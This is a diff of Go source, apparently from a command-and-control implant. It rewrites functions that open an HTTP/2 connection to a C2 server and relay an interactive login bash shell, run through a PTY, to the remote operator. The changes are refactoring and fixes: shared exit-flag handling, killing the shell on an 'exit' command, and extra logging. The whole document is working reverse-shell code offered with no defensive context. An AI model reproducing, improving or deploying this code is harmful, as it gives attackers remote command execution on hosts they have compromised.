@@ -16,8 +16,8 @@ func ActivateShell() {
 		err       error
 		streamURL = CCAddress + tun.StreamAPI
 
-		conn *h2conn.Conn // reverse shell uses this connection
-		exit = false      // when to exit
+		conn        *h2conn.Conn // reverse shell uses this connection
+		isShellExit = false      // when to exit
 	)
 
 	conn, _, _, err = ConnectCC(streamURL)
@@ -26,17 +26,21 @@ func ActivateShell() {
 		if err != nil {
 			log.Print("Closing reverseBash connection: ", err)
 		}
+		log.Print("Closed shell connection")
 	}()
 
-	go reverseShell(SendCC, RecvCC)
+	go reverseShell(SendCC, RecvCC, &isShellExit)
 
 	go func() {
 		for {
+			if isShellExit {
+				return
+			}
 			data := make([]byte, BufSize)
 			_, err = conn.Read(data)
 			if err != nil {
 				log.Print("Read remote: ", err)
-				exit = true
+				isShellExit = true
 				return
 			}
 			RecvCC <- data
@@ -44,55 +48,63 @@ func ActivateShell() {
 	}()
 
 	for outgoing := range SendCC {
-		if exit {
+		if isShellExit {
 			return
 		}
 		_, err = conn.Write(outgoing)
 		if err != nil {
 			log.Print("Send to remote: ", err)
-			exit = true
+			isShellExit = true
 		}
 	}
 }
 
 // reverseShell - Execute a reverse shell to host
-func reverseShell(send chan<- []byte, recv <-chan []byte) {
-	cmd := exec.Command("bash", "-i")
-	exit := false
+func reverseShell(send chan<- []byte, recv <-chan []byte, finished *bool) {
+	cmd := exec.Command("bash", "-li")
 
 	shellf, err := pty.Start(cmd)
 	if err != nil {
 		log.Print("start bash: ", err)
 		return
 	}
+	defer func() {
+		err = shellf.Close()
+		if err != nil {
+			log.Print("Closing shellf: ", err)
+		}
+		*finished = true
+		log.Print("reverseShell exited")
+	}()
 
+	// write CC's input to bash's PTY stdin
 	go func() {
 		for incoming := range recv {
-			if strings.Contains(string(incoming), "exit\n") {
-				exit = true
+			if strings.HasPrefix(string(incoming), "exit\n") {
+				log.Print("Exiting due to 'exit' command")
+				err = cmd.Process.Kill()
+				if err != nil {
+					log.Print("failed to kill bash shell: ", err)
+				}
+				log.Print("Killed bash shell")
+				return
 			}
 			_, err := shellf.Write(incoming)
 			if err != nil {
 				log.Print("shell write stdin: ", err)
+				return
 			}
 		}
 	}()
 
-	go func() {
-		for {
-			buf := make([]byte, BufSize)
-			_, _ = shellf.Read(buf)
-			send <- buf
-		}
-	}()
-
+	// read from bash's PTY output
 	for {
-		if exit {
-			_ = cmd.Process.Kill()
+		buf := make([]byte, BufSize)
+		_, err = shellf.Read(buf)
+		send <- buf
+		if err != nil {
+			log.Print("shell read: ", err)
 			return
 		}
-		buf := make([]byte, BufSize)
-		_, _ = shellf.Read(buf)
-		send <- buf
 	}
 }
